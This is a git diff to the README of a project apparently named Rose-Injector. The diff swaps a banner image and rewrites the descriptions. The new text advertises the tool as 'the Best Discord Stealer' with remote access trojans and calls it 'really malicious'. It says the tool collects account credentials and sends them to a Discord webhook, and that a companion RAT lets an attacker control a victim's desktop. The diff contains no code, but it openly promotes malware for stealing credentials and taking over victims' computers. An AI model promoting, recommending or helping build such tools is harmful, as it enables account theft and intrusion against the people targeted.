@@ -1,6 +1,6 @@
 <h1 id="top" align="center">
   <br>
-  <a href="https://github.com/DamagingRose/Rose-Injector"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png" width=400 weigth=400 alt="R"></a>
+  <a href="https://github.com/DamagingRose/Rose-Injector"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/rose-banner.png" width=1000 weigth=1000 alt="R"></a>
   <br>
 </h1>
 
@@ -26,8 +26,8 @@
 
 <div align="center">
     <h1>
-        The Best Discord Stealer which includes advanced remote access tools and injections
-        <br>If we reach more 🌟 = more <a href=#stars>updates</a>
+        The Best Discord Stealer which includes advanced remote access trojans and injections
+        <br><br>If we reach more 🌟 = more <a href=#stars>updates</a>
     </h1>
 </div>
 
@@ -73,9 +73,9 @@
 
 **Our professional team spent months of work on this project and we hope you will enjoy your journey through the world of cybersecurity.**
 
-[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) collects account credentials sends it to a discord webhook API.
+[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) is an advanced and really malicious trojan which collects account credentials & sends them to a discord webhook API.
 
-[Rose-RAT](https://github.com/DamagingRose/Rose-RAT) allows the attacker to control a victims desktop with our application through commands.
+[Rose-RAT](https://github.com/DamagingRose/Rose-RAT) is a remote access trojan with lots of features which allows the attacker to control a victims desktop with our application through different commands.
 
 ## <a id="features"></a> Features
 
